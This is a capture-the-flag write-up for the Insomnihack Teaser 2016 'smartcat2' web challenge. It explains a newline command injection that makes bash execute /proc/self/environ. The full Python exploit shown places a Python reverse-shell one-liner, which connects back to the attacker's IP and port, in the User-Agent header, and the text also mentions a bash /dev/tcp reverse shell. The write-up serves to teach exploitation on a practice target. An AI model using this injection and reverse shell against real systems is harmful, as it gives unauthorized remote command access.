Insomnihack Teaser 2016 – smartcat2 – 50 pt Web Challenge
---------------------------------------------------------

Part 2 of this crazy cat challenge was a bit of a stumper, until I recalled some old school web techniques that haven’t really worked for a while now. In this challenge we need to get a shell and get the flag from /home/smartcat/. Without a “space” character that sounds tricky. I know a pretty trivial way to get a shell without the space character “bash</dev/tcp/<ip>/<port>” but that was not working on this box.

Instead I needed another way to get data onto the system, this turned out pretty simple… “/proc/self/environ”…

This contains several user controlled environment variables, such as the contents of “User-Agent:” header. Better still, the contents of User-Agent is not restricted in any way. So I simply used this exploit to send myself a reverse shell:
```
#!/usr/bin/python

import requests

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

HOST = '<yourIP>'	# your IP for the reverse shell
PORT = '4443'		# port you're listening on

s = requests.Session()

# Python backdoor in the user-agent with a # at the end
headers = { 'User-Agent' : ';python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + HOST + '",' + PORT + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' #' }

# the old /proc/self/environ trick
payload = { 'dest' : chr(0xa) + 'bash</proc/self/environ'}

print "[*] Exploiting..." 
print "[+] When you get the reverse shell, issue these commands:"
print "[+] cd /home/smartcat"
print "[+] ./readflag"
print "[+] Type \"Give me a...\"<enter>"
print "[+] wait 2 seconds..."
print "[+] Type \"... flag!\"<enter>"
r = s.post(URL, data=payload, headers=headers)
```
Note the presence of the “#” mark at the end of our Python reverse shell. This is key as it prevents Bash from continuing to interpret the /proc/self/environ file and running into a set of parenthesis that cause it to fail with a syntax error.

We get our reverse shell. We learn that /home/smartcat/flag is not readable by our user. Fair enough, that would be too easy. However there’s a “readflag” setuid program that can read it for us. We need to have an interactive shell though. 

After learning all of this, and getting my shell, I was able to retrieve the flag!
